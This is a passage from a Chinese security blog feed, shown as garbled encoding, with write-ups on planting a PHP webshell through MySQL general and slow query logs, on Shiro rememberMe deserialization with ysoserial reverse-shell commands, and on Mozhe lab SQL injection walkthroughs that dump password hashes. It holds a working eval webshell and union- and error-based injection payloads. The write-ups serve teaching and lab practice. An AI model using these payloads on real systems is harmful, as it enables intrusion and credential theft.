å¦‚å›¾æ‰€ç¤º<code>general_log=OFF</code>å…¨å±€æ—¥å¿—æœªå¼€å¯<br><img src="https://img-blog.csdnimg.cn/44c04cc005934a129868ddd10b8c2e3f.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">å¼€å¯å…¨å±€æ—¥å¿— </span><br><span class="line"><span class="built_in">set</span> global general_log = on; </span><br><span class="line">å°†å…¨å±€æ—¥å¿—è·¯å¾„è®¾ç½®ä¸ºshellæ–‡ä»¶è·¯å¾„ </span><br><span class="line"><span class="built_in">set</span> global general_log_file = <span class="string">&#x27;D:/phpstudy_pro/WWW/shell.php&#x27;</span>;  </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/3c4264123e154720b26fab468da00c9a.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ–°å»ºæŸ¥è¯¢<span class="built_in">select</span> <span class="string">&#x27;&lt;?php  @eval($_POST[1]);?&gt;&#x27;</span>; </span><br></pre></td></tr></table></figure><p>   mysqlä¼šå°†æ‰§è¡Œçš„è¯­å¥è®°å½•åˆ°å…¨å±€æ—¥å¿—ï¼Œä»è€Œå°†shellå†™å…¥ç½‘ç«™ç›®å½•</p><p>   <img src="https://img-blog.csdnimg.cn/400cc6ceb41546b6a38f222c7cc776fb.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>   èšå‰‘è¿æ¥æˆåŠŸ</p><ol start="4"><li>æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shell<br>ç”±äºåœ¨mysql&gt;5.6.34ä¸­ï¼Œ<code>secure_file_priv</code>ä¼šé˜»æ‹¦æˆ‘ä»¬ä½¿ç”¨outfileå†™å…¥æ–‡ä»¶ï¼Œæ²¡æœ‰æœåŠ¡å™¨æƒé™æ— æ³•ä¿®æ”¹my.inié…ç½®æ–‡ä»¶ï¼Œå¯ä»¥åˆ©ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—å†™å…¥shellï¼ŒåŸç†å’Œåˆ©ç”¨å…¨å±€æ—¥å¿—å·®ä¸å¤šã€‚é¦–å…ˆä¸€æ ·æŸ¥çœ‹æ…¢æŸ¥è¯¢æ—¥å¿—æ˜¯å¦å¼€å¯ <figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show variables like <span class="string">&#x27;%slow_query_log%&#x27;</span>;  </span><br></pre></td></tr></table></figure><img src="https://img-blog.csdnimg.cn/0c157e9b78d94f558fa2810fb9b612c6.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></li></ol><p>   å¼€å¯æ…¢æŸ¥è¯¢æ—¥å¿—å¹¶ä¿®æ”¹æ—¥å¿—æ–‡ä»¶çš„ç»å¯¹è·¯å¾„  </p><p>   <img src="https://img-blog.csdnimg.cn/c39b3347745f4fab952e9f2d5e227e03.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>   ä½¿ç”¨æ…¢æŸ¥è¯¢æ—¥å¿—æ—¶ï¼Œåªæœ‰å½“æŸ¥è¯¢æ—¶é—´è¶…è¿‡ç³»ç»Ÿæ—¶é—´æ—¶æ‰ä¼šè®°å½•åœ¨æ—¥å¿—ä¸­ </p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æŸ¥è¯¢mysqlç³»ç»Ÿæ—¶é—´ show global variables like <span class="string">&#x27;%long_query_time%&#x27;</span>;  </span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/373a27b72f2842daa1068ddf60dba949.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>   å‘æ—¥å¿—ä¸­å†™å…¥shell</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[1]);?&gt;&#x27;</span> or <span class="built_in">sleep</span>(<span class="number">11</span>);è®¾ç½®æŸ¥è¯¢æ—¶é—´ä¸º<span class="number">11</span>s</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/73414b3a6c5446c79613d1ec565f66be.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>   æ‰§è¡ŒæˆåŠŸ<br>     <img src="https://img-blog.csdnimg.cn/7aa6d66c6eff48df85d9b006f8617c02.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>   èšå‰‘è¿æ¥æˆåŠŸ</p><ol start="5"><li>phpMyAdminæ–‡ä»¶åŒ…å«æ¼æ´<br>CVE-2018-19968<br>CVE-2018-12613<br>CVE-2016-5734<br>CVE-2014-8959</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Mysqlå†™shellçš„å‡ ç§æ–¹å¼&quot;&gt;&lt;a href=&quot;#Mysqlå†™shellçš„å‡ ç§æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;Mysqlå†™shellçš„å‡ ç§æ–¹å¼&quot;&gt;&lt;/a&gt;&lt;strong&gt;Mysqlå†™shellçš„å‡ ç§æ–¹å¼&lt;/strong&gt;&lt;/h2&gt;</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sqlæ³¨å…¥" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysqlæ³¨å…¥" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="getshell" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/getshell/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="getshell" scheme="https://redredredfish.github.io/tags/getshell/"/>
    
  </entry>
  
  <entry>
    <title>shiroååºåˆ—åŒ–çš„åˆçº§ç†è§£</title>
    <link href="https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://redredredfish.github.io/2021/07/06/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-07-06T02:37:00.000Z</published>
    <updated>2021-12-06T03:09:26.034Z</updated>
    
    <content type="html"><![CDATA[<h2 id="shiroååºåˆ—åŒ–åŸç†"><a href="#shiroååºåˆ—åŒ–åŸç†" class="headerlink" title="shiroååºåˆ—åŒ–åŸç†"></a>shiroååºåˆ—åŒ–åŸç†</h2><p><strong>rememberMeåŠŸèƒ½ï¼š</strong><br>shiroæ¡†æ¶æä¾›äº†rememberMeåŠŸèƒ½ï¼Œè¿™ä¸ªåŠŸèƒ½å¤§æ¦‚æ˜¯ç”¨æˆ·ç™»å½•æˆåŠŸåä¼šç”Ÿæˆä¸€ä¸ªå‡­è¯ç»„ï¼Œshiroå°†å®ƒç»è¿‡åºåˆ—åŒ–-&gt;AESåŠ å¯†-&gt;Base64åŠ å¯†å¾—åˆ°ä¸€ä¸²æ•°æ®æµä¼ å›ç»™cookieï¼Œä¸‹æ¬¡ç™»å½•æ—¶ï¼Œshiroé€šè¿‡Base64è§£ç -&gt;AESè§£å¯†-&gt;ååºåˆ—åŒ–éªŒè¯cookieä¸­çš„rememberMeåŒ…å«çš„å‡­è¯ç»„æ˜¯å¦æ­£ç¡®ï¼Œä»è€Œå®ç°â€œä¸‹æ¬¡ç™»å½•è®°ä½æˆ‘â€çš„åŠŸèƒ½ã€‚</p><p>  <strong>æ¼æ´åŸç†ï¼š</strong><br>é€ æˆshiroååºåˆ—åŒ–æ¼æ´çš„å…³é”®ç‚¹ï¼Œä¸€ä¸ªæ˜¯Shiro&lt;1.2.4ä¸­ï¼ŒAES-CBCåŠ è§£å¯†æ—¶keyé»˜è®¤ä¸ºç¡¬ç¼–ç ï¼Œåªè¦èƒ½è·å–åˆ°è¿™ä¸ªkeyå°±å¯ä»¥æ„é€ æ¶æ„æ•°æ®è®©shiroè¯†åˆ«ä¸ºæ­£å¸¸æ•°æ®ï¼›å¦ä¸€ä¸ªç‚¹æ˜¯shiroåœ¨éªŒè¯rememberMeæ—¶ä½¿ç”¨äº†readObjectæ–¹æ³•ï¼ŒreadObjectç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–åéœ€è¦æ‰§è¡Œçš„ä»£ç ç‰‡æ®µï¼Œä»è€Œé€ æˆæ¶æ„å‘½ä»¤å¯ä»¥è¢«æ‰§è¡Œã€‚</p><p>  <strong>æ¼æ´åˆ©ç”¨ï¼š</strong></p><ol><li>é¦–å…ˆéœ€è¦è·å–æ­£ç¡®çš„keyå€¼ï¼Œåˆ©ç”¨shiroæ¥æ”¶é”™è¯¯rememberMeä¼šæŠ›å‡ºå¼‚å¸¸è¿”å›Set-Cookieçš„ç‰¹æ€§ï¼Œå¯ä»¥é€šè¿‡çˆ†ç ´ï¼Œç›´åˆ°å“åº”å¤´ä¸­ä¸åŒ…å«Set-Cookieï¼Œè¯´æ˜keyæˆåŠŸåŒ¹é…ã€‚</li><li>æ¥ç€éœ€è¦å¯¹æ¶æ„æ•°æ®è¿›è¡Œåºåˆ—åŒ–ï¼Œshiroåºåˆ—åŒ–å¯¹è±¡åªæœ‰ç»§æ‰¿PrincipalCollectionæ—¶ï¼Œç±»å‹è½¬æ¢æ‰æ­£å¸¸ï¼Œä¸ç„¶ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè¿™é‡Œå¯ä»¥å€ŸåŠ©ysoserialç”Ÿæˆåºåˆ—åŒ–æ•°æ®ï¼š<br>åˆ©ç”¨ysoserialä¸­çš„JRMPç›‘å¬æ¨¡å—è¿›è¡Œåå¼¹shellï¼Œéœ€ä½¿ç”¨Java Runtime é…åˆ bash ç¼–ç  java -cp</li><li>ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener ç›‘å¬ç«¯å£<br>CommonsCollections4 â€˜bashç¼–ç â€™ åˆ©ç”¨ysoserialç”Ÿæˆ.seræ–‡ä»¶ java -jar<br>ysoserial-0.0.6-SNAPSHOT-all.jar CommonsBeanutils1 â€œå‘½ä»¤â€ &gt; x.ser</li><li>ç„¶åè¿›è¡ŒAESåŠ å¯†ã€Base64åŠ å¯†ï¼Œä¼ªé€ cookieï¼Œæ‰§è¡Œå‘½ä»¤</li></ol><h2 id="å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶"><a href="#å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶" class="headerlink" title="å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶"></a>å¦‚ä½•åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†shiroæ¡†æ¶</h2><p>åœ¨è¯·æ±‚åŒ…ä¸­çš„cookieå­—æ®µæ·»åŠ rememberMe=xxx,æŸ¥çœ‹å“åº”å¤´ä¸­æ˜¯å¦åŒ…å«rememberMe=deleteMeå€¼<br>ä¾‹å¦‚ï¼š<br><img src="https://img-blog.csdnimg.cn/5a2a09b4e61442c199210cddbfcda914.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L1JlZHJlZHJlZGZpc2g=,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;shiroååºåˆ—åŒ–åŸç†&quot;&gt;&lt;a href=&quot;#shiroååºåˆ—åŒ–åŸç†&quot; class=&quot;headerlink&quot; title=&quot;shiroååºåˆ—åŒ–åŸç†&quot;&gt;&lt;/a&gt;shiroååºåˆ—åŒ–åŸç†&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;rememberMeåŠŸèƒ½ï¼š&lt;/strong&gt;&lt;br&gt;</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="ååºåˆ—åŒ–æ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
    
    <category term="shiroååºåˆ—åŒ–" scheme="https://redredredfish.github.io/tags/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    <category term="ååºåˆ—åŒ–æ¼æ´" scheme="https://redredredfish.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>å¢¨è€…-SQLæ³¨å…¥æ¼æ´æµ‹è¯•(æŠ¥é”™ç›²æ³¨) é¢˜è§£</title>
    <link href="https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/"/>
    <id>https://redredredfish.github.io/2021/06/21/%E5%A2%A8%E8%80%85-SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95-%E6%8A%A5%E9%94%99%E7%9B%B2%E6%B3%A8-%E9%A2%98%E8%A7%A3/</id>
    <published>2021-06-21T08:20:00.000Z</published>
    <updated>2021-12-08T08:26:44.798Z</updated>
    
    <content type="html"><![CDATA[<p>é¶åœºåœ°å€ï¼š<a href="https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe</a></p><p>ä¾æ—§æ˜¯mysqlã€æ— é˜²æŠ¤</p><p>â‘ ä¾æ—§æ˜¯å…¬å‘Šç•Œé¢</p><p>url:<a href="http://219.153.49.228:44679/new_list.php?id=1">http://219.153.49.228:44679/new_list.php?id=1</a></p><p><code>1&#39;,1&#39; and &#39;1&#39;=&#39;1&#39; -- q,1&#39; and &#39;1&#39;=&#39;2&#39; -- q</code>åˆ¤æ–­å­˜åœ¨å­—ç¬¦å‹æ³¨å…¥</p><p>æ•°æ®åº“ç±»å‹ä¸ºMariaDB</p><p>â‘¡order by åˆ¤æ–­å­—æ®µæ•°ä¸º4ï¼Œunion selectæ— å›æ˜¾</p><p>â‘¢å°è¯•æŠ¥é”™æ³¨å…¥ï¼Œåˆ©ç”¨å‡½æ•°updatexml()</p><p>updatexmlå‚æ•°(ç›®æ ‡xmlå†…å®¹,xmlæ–‡æ¡£è·¯å¾„,æ›´æ–°çš„å†…å®¹)</p><p>å½“æ–‡æ¡£è·¯å¾„åŒ…å«å­—ç¬¦<code>~</code>,ä¼šåˆ¤æ–­ä¸åˆæ³•ï¼Œè¾“å‡ºå­—ç¬¦<code>~</code>æŠ¥é”™</p><p>åˆ©ç”¨concatå‡½æ•°å°†å­æŸ¥è¯¢è¯­å¥ä¸å­—ç¬¦~æ‹¼æ¥</p><p>ä¾‹å¦‚ï¼š<code>concat(0x7e,(select user()))</code></p><p>ä¼šå°†æŸ¥è¯¢ç»“æœæ‹¼æ¥~æŠ¥é”™è¾“å‡º</p><p>æ‰€ä»¥å°è¯•</p><p><code>id=1&#39; and updatexml(1,concat(0x7e,(select user())),1) -- q</code><br><img src="https://img-blog.csdnimg.cn/fd2e6ce1b95843f1ba7350621e7bd1de.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>åˆ¤æ–­å­˜åœ¨æŠ¥é”™æ³¨å…¥</p><p>â‘£æ¥ä¸‹æ¥è¿˜æ˜¯è”åˆæ³¨å…¥é‚£ä¸€å¥—ï¼Œæ›¿æ¢å­æŸ¥è¯¢è¯­å¥å³å¯</p><p><code>id=1&#39; and updatexml(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata)),1) -- q</code></p><p>çˆ†å‡ºåº“åinformation_schema,mysql,perfor</p><p>æŸ¥è¯¢perforåº“æ˜¯ç©ºçš„</p><p>database()æŸ¥è¯¢å‡ºå½“å‰æ•°æ®åº“ä¸º<strong>stormgroup</strong>ï¼Œå±…ç„¶ä¸åœ¨schema_nameé‡Œ</p><p>çˆ†å‡ºè¡¨åmember,notice</p><p>è¡¨memberçˆ†å‡ºå­—æ®µname,password,status</p><p>â‘¤åˆ†åˆ«æŸ¥è¯¢å­—æ®µå€¼</p><p><code>id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(å­—æ®µ) from member)),1) -- q</code></p><p>nameå­—æ®µï¼šmozhe,mozhe</p><p>statuså­—æ®µï¼š0,1</p><p>æŸ¥è¯¢passwordå­—æ®µæ—¶ï¼Œæ ¹æ®å¦å¤–ä¸¤ä¸ªå­—æ®µå¯çŸ¥æœ‰ä¸¤æ¡æ•°æ®ï¼Œå› ä¸ºæŠ¥é”™é•¿åº¦æœ€å¤šä¸º32ä½ï¼Œå­—ç¬¦~å äº†1ä½ï¼Œå‰©ä¸‹31ä½ä¸å¤Ÿè¾“å‡ºç¬¬ä¸€ä¸ª32ä½çš„MD5å¯†ç ï¼Œè€Œä¸”ç¬¬ä¸€æ¡æ•°æ®statuså­—æ®µå€¼ä¸º0ï¼Œå¤§æ¦‚ç‡ç”¨ä¸äº†ã€‚</p><p>ç›´æ¥æŸ¥è¯¢ç¬¬äºŒæ¡æ•°æ®</p><p><code>id=11111111&#39; and updatexml(1,concat(0x7e,(select group_concat(password) from member where status=&#39;1&#39;)),1) -- q</code><br><img src="https://img-blog.csdnimg.cn/7399583641f94eee805ebb3f2d6a0c21.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>å¾—åˆ°~76e59b744c5db295a5f0b66f2e9a192</p><p>ä¾æ—§å°‘äº†ä¸€ä½ï¼Œåˆ©ç”¨å‡½æ•°substr(å­—ç¬¦ä¸²ï¼Œ32ï¼Œ1)è¾“å‡ºç¬¬32ä½å­—ç¬¦</p><p><code>id=11111111&#39; and updatexml(1,concat(0x7e,(select substr(group_concat(password),32,1) from member where status=1)),1) -- q</code></p><p>å¾—åˆ°~e</p><p>æ‹¼ä¸€æ‹¼å¾—åˆ°76e59b744c5db295a5f0b66f2e9a192e</p><p>è§£å¯†å¾—åˆ°945748</p><p>mozhe/945748ç™»å½•å¾—åˆ°key</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;é¶åœºåœ°å€ï¼š&lt;a href=&quot;https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3Wi81bDh3Ulp0bGhOUT09bW96aGUmozhe&quot;&gt;https://www.mozhe.cn/bug/detail/Ri9CaDcwWVl3W</summary>
      
    
    
    
    <category term="webæ¼æ´" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/"/>
    
    <category term="sqlæ³¨å…¥" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysqlæ³¨å…¥" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="é¶åœº" scheme="https://redredredfish.github.io/categories/web%E6%BC%8F%E6%B4%9E/sql%E6%B3%A8%E5%85%A5/mysql%E6%B3%A8%E5%85%A5/%E9%9D%B6%E5%9C%BA/"/>
    
    
    <category term="sqlæ³¨å…¥" scheme="https://redredredfish.github.io/tags/sql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="mysqlæ³¨å…¥" scheme="https://redredredfish.github.io/tags/mysql%E6%B3%A8%E5%85%A5/"/>
    
    <category term="æŠ¥é”™æ³¨å…¥" scheme="https://redredredfish.github.io/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>å¢¨è€…-SQLæ‰‹å·¥æ³¨å…¥æ¼æ´æµ‹è¯•ï¼ˆMySQLæ•°æ®åº“-å­—ç¬¦å‹ï¼‰é¢˜è§£</title>
    <link href="https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/"/>
    <id>https://redredredfish.github.io/2021/06/20/%E5%A2%A8%E8%80%85-SQL%E6%89%8B%E5%B7%A5%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%B5%8B%E8%AF%95%EF%BC%88MySQL%E6%95%B0%E6%8D%AE%E5%BA%93-%E5%AD%97%E7%AC%A6%E5%9E%8B%EF%BC%89%E9%A2%98%E8%A7%A3/</id>
    <published>2021-06-20T08:14:00.000Z</published>
    <updated>2021-12-08T08:26:34.683Z</updated>
    
    <content type="html"><![CDATA[<p>é¶åœºåœ°å€ï¼š<a href="https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe">https://www.mozhe.cn/bug/detail/dE1HSW5yYThxUHcyUTZab2pTcmpGUT09bW96aGUmozhe</a></p><p>é¢˜è§£ï¼š<br>â‘ å¯åŠ¨é¶åœº</p><p>urlï¼š<a href="http://219.153.49.228:43157/">http://219.153.49.228:43157/</a></p><p>æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œæ˜¾ç„¶éœ€è¦ç™»å½•è·å¾—keyï¼Œä¸€å¼€å§‹ä½¿ç”¨ä¸‡èƒ½å¯†ç ã€æŠ“åŒ…éƒ½æ²¡æ‰¾åˆ°æ³¨å…¥ç‚¹ï¼Œç»“æœåœ¨è¿™ä¸ªæ»šåŠ¨çš„å…¬å‘Šé¡µé¢</p><p>url:<a href="http://219.153.49.228:43157/new_list.php?id=tingjigonggao">http://219.153.49.228:43157/new_list.php?id=tingjigonggao</a><br><img src="https://img-blog.csdnimg.cn/51f8edc0bf6448e5a5e95f742b23f456.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â‘¡è¿›å…¥é¡µé¢ï¼Œurlä¸­æœ‰id=tingjigonggaoï¼Œæ˜¾ç¤ºæ˜¯getçš„å­—ç¬¦å‹å‚æ•°<br>   è¯•ä¸€ä¸‹<code>id=tingjigonggao&#39;</code>ï¼ŒæŠ¥é”™<br>  <img src="https://img-blog.csdnimg.cn/7adce1bac5ed4ee49c0dc0ef15b9bf5c.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>  è¯•ä¸€ä¸‹<code>id=tingjigonggao&#39; and &#39;1&#39;=&#39;1&#39; -- q</code>,é¡µé¢æ­£å¸¸<br>  <img src="https://img-blog.csdnimg.cn/184dd5f313fd4ae18d082d41f50e78a4.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>  è¯•ä¸€ä¸‹<code>id=tingjigonggao&#39; and &#39;1&#39;=&#39;2&#39; -- q</code>,é¡µé¢ä¸æ­£å¸¸<br>  <img src="https://img-blog.csdnimg.cn/975d5837a2df4302ba477de8a3624ff5.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>  åˆ¤æ–­å­˜åœ¨å­—ç¬¦å‹æ³¨å…¥ã€‚</p><p>â‘¢åˆ¤æ–­å­—æ®µæ•°</p><p><code>id=aaa&#39; order by 5 -- q</code>ï¼ŒæŠ¥é”™</p><p><code>id=aaa&#39; order by 4 -- q</code>ï¼Œæ²¡æ•°æ®ï¼Œæ­£å¸¸</p><p>åˆ¤æ–­å­—æ®µæ•°ä¸º4ã€‚</p><p>â‘£åˆ¤æ–­å›æ˜¾ç‚¹</p><p><code>id=aaa&#39; union select 1,2,3,4 -- q</code><br><img src="https://img-blog.csdnimg.cn/20e02e084f794627b1deeb1aa3be175b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>2,3å‚æ•°å¤„å›æ˜¾ã€‚</p><p>â‘¤å‚æ•°æ›¿æ¢<code>version()</code>æŸ¥çœ‹ç‰ˆæœ¬</p><p><code>id=aaa&#39; union select 1,2,version(),4 -- q</code><br><img src="https://img-blog.csdnimg.cn/a578cbaf0d2449e3a10c937646096dc9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>MariaDB-10.2.15&gt;mysql5.0,æ”¾å¿ƒç”¨information_schemaåº“ã€‚</p><p>â‘¥æŸ¥è¯¢æ‰€æœ‰åº“å</p><p><code>id=aaa&#39; union select 1,2,group_concat(schema_name),4 from information_schema.schemata -- q</code><br><img src="https://img-blog.csdnimg.cn/c91d51f830314f30a92a8057600b6184.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è·å¾—åº“åinformation_schema,mozhe_discuz_stormgroup,mysql,performance_schema,test</p><p>â‘¦æŸ¥è¯¢mozhe_discuz_stormgroupåº“ä¸­çš„è¡¨<br><code>id=aaa&#39; union select 1,2,group_concat(table_name),4 from information_schema.tables where table_schema=&#39;mozhe_discuz_stormgroup&#39; -- q</code><br>è·å¾—è¡¨ånotice,stormgroup_member<br><img src="https://img-blog.csdnimg.cn/8f85e4c2d2fc44759c55f4fbc057d92f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>â‘§æŸ¥è¯¢stormgroup_memberè¡¨ä¸­å­—æ®µå<br><code>id=aaa&#39; union select 1,2,group_concat(column_name),4 from information_schema.columns where table_name=&#39;stormgroup_member&#39; -- q</code><br>è·å¾—å­—æ®µåid,name,password,status<br><img src="https://img-blog.csdnimg.cn/afcb4a431bb34334868b3efe12c56152.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAUmVkcmVkcmVkZmlzaA==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â‘¨æŸ¥è¯¢å­—æ®µå€¼<br><code>id=aaa&#39; union select 1,2,group_concat(name,0x7c,password),4 from stormgroup_member -- q</code><br>è·å–ç”¨æˆ·åå’ŒMD5åŠ å¯†çš„password<br>mozhe|356f589a7df439f6f744ff19bb8092c0,mozhe|57673e9e6b26829ba7a4b4d43e8ae8a7<br>somd5è§£å¯†å¾—åˆ°ä¸¤ä¸ªå¯†ç 